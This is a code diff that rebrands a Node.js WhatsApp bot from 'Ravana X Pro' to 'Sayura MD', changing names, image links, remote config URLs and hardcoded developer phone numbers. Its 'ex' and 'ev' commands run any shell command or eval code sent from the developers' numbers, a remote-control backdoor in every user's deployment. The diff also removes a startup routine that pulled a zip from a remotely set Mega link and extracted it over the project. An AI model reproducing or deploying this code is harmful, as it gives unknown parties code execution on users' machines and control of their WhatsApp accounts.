@@ -24,9 +24,9 @@ const config = require('./config')
 const qrcode = require('qrcode-terminal')
 const NodeCache = require('node-cache')
 const util = require('util')
-let getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile, sms, downloadMediaMessage;
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
+const { sms, downloadMediaMessage } = require('./lib/msg')
 const axios = require('axios')
-const AdmZip = require('adm-zip')
 const { File } = require('megajs')
 const path = require('path')
 const msgRetryCounterCache = new NodeCache()
@@ -37,13 +37,43 @@ require('events').EventEmitter.defaultMaxListeners = 0;
 
 const FileType = require('file-type')
 const l = console.log
-
-let updateCMDStore, isbtnID, getCMDStore, getCmdForCmdId, connectdb, input, get, getalls, updb, updfb, upresbtn;
+var {
+  updateCMDStore,
+  isbtnID,
+  getCMDStore,
+  getCmdForCmdId,
+  connectdb,
+  input,
+  get,
+  getalls,
+  updb,
+  updfb,
+  upresbtn,
+} = require("./lib/database");
 const ownerNumber = [`${config.OWNER_NUMBER}`];
+//===================SESSION======.===========kj===h========
 
-//===================SESSION===========================
+const df = __dirname + '/auth_info_baileys/creds.json';
 
-const df = path.join(__dirname, 'auth_info_baileys', 'creds.json');
+if (!fs.existsSync(df)) {
+  if (config.SESSION_ID) {
+    const sessdata = config.SESSION_ID.replace("SAYURA-MD=", "");
+
+    if (sessdata.includes("#")) {
+      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
+      filer.download((err, data) => {
+        if (err) throw err;
+        fs.writeFile(df, data, () => {
+          console.log("✅ Mega session download completed and saved to creds.json !!");
+        });
+      });
+    } else {
+      (async () => {
+        await downloadSession(sessdata, df);
+      })();
+    }
+  }
+}
 
 async function downloadSession(sessdata, df) {
   const dbUrls = [
@@ -52,33 +82,32 @@ async function downloadSession(sessdata, df) {
   ];
 
   let success = false;
+
   for (let i = 0; i < dbUrls.length; i++) {
     const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
-    console.log(`📥 Downloading session from Ravanaxpro-DB...`);
+    console.log(`📥 Downloading session from Sayura-DB`);
 
     try {
       const response = await axios.get(sessionUrl);
+
       if (response.data && Object.keys(response.data).length > 0) {
-        if (!fs.existsSync(path.dirname(df))) {
-          fs.mkdirSync(path.dirname(df), { recursive: true });
-        }
+        await sleep(1000);
         fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
-        console.log(`✅ Session file downloaded and saved to creds.json`);
+        console.log(`✅ Session file downloaded successfully and saved to creds.json`);
         success = true;
         break;
+      } else {
+        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
       }
+
     } catch (err) {
-      console.error(`❌ DB-${i + 1} Error: ${err.message}`);
+      console.error(`❌ Failed to download local DB session file: ${err.message}`);
     }
   }
-}
 
-// මෙතනදී Mega එකෙන් බාන කෑල්ල අපි අයින් කළා, මොකද ඔයා කිව්වා Mega එකේ ෆයිල් එක නැහැ කියලා.
-if (!fs.existsSync(df) && config.SESSION_ID) {
-    const sessdata = config.SESSION_ID.replace("SAYURA-MD=", "");
-    (async () => {
-        await downloadSession(sessdata, df);
-    })();
+  if (!success) {
+    console.error("❌ All DB servers failed to provide a valid session file.");
+  }
 }
 
 // <<==========PORTS============>>
@@ -86,69 +115,7 @@ const express = require("express");
 const app = express();
 const port = process.env.PORT || 8000;
 //====================================
-
-async function downloadExternalPlugins() {
-    try {
-        const response = await axios.get('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json');
-        const megaUrl = response.data.megaurl; 
-
-        if (megaUrl && megaUrl.includes("mega.nz")) {
-            console.log("📥 Plugins Extracting Start....");
-            const file = File.fromURL(megaUrl);
-            const buffer = await file.downloadBuffer();
-            
-            const tempZip = './plugins_temp.zip';
-            fs.writeFileSync(tempZip, buffer);
-            
-            const zip = new AdmZip(tempZip);
-            zip.extractAllTo("./", true); 
-            
-            fs.unlinkSync(tempZip);
-            console.log("✅ Plugins Extract Succesfilly!!");
-        }
-    } catch (err) {
-        console.error("⚠️ Plugin Sync Failed:", err.message);
-    }
-}
-
-
-//====================================
-
 async function connectToWA() {
-    
-    // (A) මුලින්ම Mega එකෙන් අලුත් Plugins බානවා
-    await downloadExternalPlugins();
-
-	const lib = require('./lib/functions');
-    const msg = require('./lib/msg');
-    const db = require("./lib/database");
-
-	connectdb = db.connectdb;
-    updb = db.updb;
-    getalls = db.getalls;
-    updateCMDStore = db.updateCMDStore;
-    isbtnID = db.isbtnID;
-    getCMDStore = db.getCMDStore;
-    getCmdForCmdId = db.getCmdForCmdId;
-
-    fetchJson = lib.fetchJson;
-    getBuffer = lib.getBuffer;
-    getGroupAdmins = lib.getGroupAdmins;
-    sleep = lib.sleep;
-    sms = msg.sms;
-    downloadMediaMessage = msg.downloadMediaMessage;
-	
-    // (B) දැන් ZIP එකේ තිබුණු අලුත් Plugins load කරනවා
-    fs.readdirSync("./plugins/").forEach((plugin) => {
-        if (path.extname(plugin).toLowerCase() == ".js") {
-            try {
-                require("./plugins/" + plugin);
-            } catch (e) {
-                console.error(`Error loading plugin ${plugin}:`, e);
-            }
-        }
-    });
-    console.log('All Plugins installed ⚡');
 //Run the function
 
     const {
@@ -175,7 +142,7 @@ async function connectToWA() {
 
 
 
-const responsee = await axios.get('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json');
+const responsee = await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json');
 const connectnumber = responsee.data
 	
 // Default owner JID
@@ -194,9 +161,9 @@ conn.ev.on('connection.update', async (update) => {
         setTimeout(async () => {
             try {
                 // Fetch custom connect message from server
-                let captionText = '✅ RAVANAXPRO connected successfully!';
+                let captionText = '✅ SAYURA connected successfully!';
                 try {
-                    const response = await axios.get('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json');
+                    const response = await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json');
                     const ownerdataa = response.data;
                     captionText = ownerdataa?.connectmg || captionText;
                 } catch (fetchErr) {
@@ -205,7 +172,7 @@ conn.ev.on('connection.update', async (update) => {
 
                 // Send initial connect image
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://files.catbox.moe/m94645.jpg' },
+                    image: { url: 'https://files.catbox.moe/d0v6fe.png' },
                     caption: captionText
                 });
 const mvSize = config.MV_SIZE;
@@ -247,7 +214,7 @@ const antiDelete = config.ANTI_DELETE;
 const leaveMsg = config.LEAVE_MSG;
                 // Build config message
   const can = `
-*⚓ RAVANA X PRO SETTINGS AVAIBLE NOW ⚓*
+*🫟 𝐒𝐀𝐘𝐔𝐑𝐀  𝐌𝐃 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 🫟*
 
 *\`• Owner Number :\`* ${DEFAULT_OWNER_JID || "Not Set"}
 *\`• Bot Name :\`* ${botName || "Not Set"}
@@ -283,13 +250,13 @@ const leaveMsg = config.LEAVE_MSG;
 *\`• Action :\`* ${action ?? "delete"}
 *\`• Antilink Action :\`* ${antiLinkAction ?? "delete"}
 *\`• Values :\`* ${values?.length ? values.join(", ") : "None"}
-*\`• Logo :\`* ${logo ?? "https://files.catbox.moe/m94645.jpg"}
+*\`• Logo :\`* ${logo ?? "https://files.catbox.moe/d0v6fe.png"}
 *\`• Anti Delete :\`* ${antiDelete ?? "off"}
 *\`• Leave Msg :\`* ${leaveMsg || "None"}
 `;
 
 
-     let joinlink2 = await fetchJson('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json');
+     let joinlink2 = await fetchJson('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json');
         
         if (!joinlink2 || !joinlink2.supglink) {
             console.error('❌ Invalid join link data!');
@@ -309,7 +276,7 @@ const leaveMsg = config.LEAVE_MSG;
 				 console.log("✅ Successfully joined the group!");
                 // Send config message
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://files.catbox.moe/m94645.jpg' },
+                    image: { url: 'https://files.catbox.moe/d0v6fe.png' },
                     caption: can
                 });
 
@@ -322,10 +289,17 @@ const leaveMsg = config.LEAVE_MSG;
 });
       
 
+const path = require('path');
+fs.readdirSync("./plugins/").forEach((plugin) => {
+  if (path.extname(plugin).toLowerCase() == ".js") {
+      require("./plugins/" + plugin);
+  }
+});
 
+console.log('All Plugins installed ⚡')
 await connectdb()
 await updb()		
-console.log('RAVANAXPRO SETTINGS DL CONNECTED ✅')
+console.log('SAYURA SETTINGS DL CONNECTED ✅')
 
 
 
@@ -337,7 +311,7 @@ console.log('RAVANAXPRO SETTINGS DL CONNECTED ✅')
 
 
 
-const ownerdataa = (await axios.get('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json')).data;
+const ownerdataa = (await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json')).data;
      
          
 
@@ -456,7 +430,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94754871798,94771098429`
+const developers = `94743826406,94777145463`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -866,12 +840,12 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   }
 }
 
-const ownerdata = (await axios.get('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json')).data
+const ownerdata = (await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json')).data
             
            
             config.FOOTER = ownerdata.footer
            
-const preUser = await fetchJson(`https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/prime_users.json`)
+const preUser = await fetchJson(`https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/prime_users.json`)
 const preUsers = preUser.numbers.split(",");
 
 // replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
@@ -885,7 +859,7 @@ const isPre = preUsers
 
 	    
 //============================================================================ 
-const banbn = await fetchJson(`https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/ban_number.json`)
+const banbn = await fetchJson(`https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/ban_number.json`)
 const plynYnna = banbn.split(",")
 const isBanUser = [ ...plynYnna ]
       .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
@@ -902,7 +876,7 @@ const isBanGrp = [ ...gpIdz ]
 
 
 const banGroups = await fetchJson(
-  "https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/ban_group.json"
+  "https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/ban_group.json"
 );          // banGroups === [ "1203...", ... ]
 
 const isBanvisper = banGroups
@@ -920,9 +894,9 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-const rec = (await axios.get('https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/react.json')).data
+const rec = (await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/react.json')).data
 
-const recc = (await axios.get('https://raw.githubusercontent.com/sayuramd49-lab/Data/refs/heads/main/main_var.json')).data
+const recc = (await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json')).data
 
 //================================================================================================================	    
 const id = mek.key.server_id
@@ -932,10 +906,13 @@ await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
 await conn.newsletterReactMessage(`120363405102534270@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("94754871798")){
+if(senderNumber.includes("94777145463")){
 if(isReact) return
-m.react(`${rec.dileesha}`)
+m.react(`${rec.sadas}`)
 }
+
+		
+// Only Admin bot Admin Bot React
 		
 const ownNum = config.OWNER_NUMBER;
 
@@ -978,7 +955,7 @@ if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
 if ( isBanUser ) {
 	await conn.sendMessage(from, { delete: mek.key })
 	await conn.groupParticipantsUpdate(from, [sender], 'remove')
-	return await conn.sendMessage(from, { text: "*You are banned by RAVANA TEAM ❌*" })
+	return await conn.sendMessage(from, { text: "*You are banned by GOJO MD TEAM ❌*" })
 }
 
 	
@@ -1314,12 +1291,12 @@ if(!isOwner) {
     if(originalMessage.message.stickerMessage){
      
     //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
-     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-X-PRO 🌟'})
+     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-PRO 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
     
     }else{
     
-    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-X-MD 🌟'})
+    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-PRO 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
     
       }
@@ -1365,7 +1342,7 @@ if(!isOwner) {
   //==================================================================================================================================================================== 
 
 //==================================================================================================================================================================
-const bad = await fetchJson(`https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/bad_word.json`);
+const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`);
 
 if (config.ANTI_BAD === "true" && isGroup) { // Run only in groups
   if (!isMe && !groupAdmins.includes(sender)) { // Only non-admins
@@ -1689,7 +1666,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94754871798) {
+      if(senderNumber == 94743826406) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1701,7 +1678,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94754871798) {
+      if(senderNumber == 94743826406) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1722,7 +1699,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94754871798) {
+      if(senderNumber == 94743826406) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1737,7 +1714,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94754871798 || senderNumber == 94771098429) {
+    if(senderNumber == 94743826406 || senderNumber == 94777145463) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1764,9 +1741,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("RAVANA-XPRO Working successfully!");
+  res.send("🎯 SAYURA MD DL Working successfully!");
 });
-app.listen(port, () => console.log(`Ravana-Xpro Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Sayura-System-Download Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
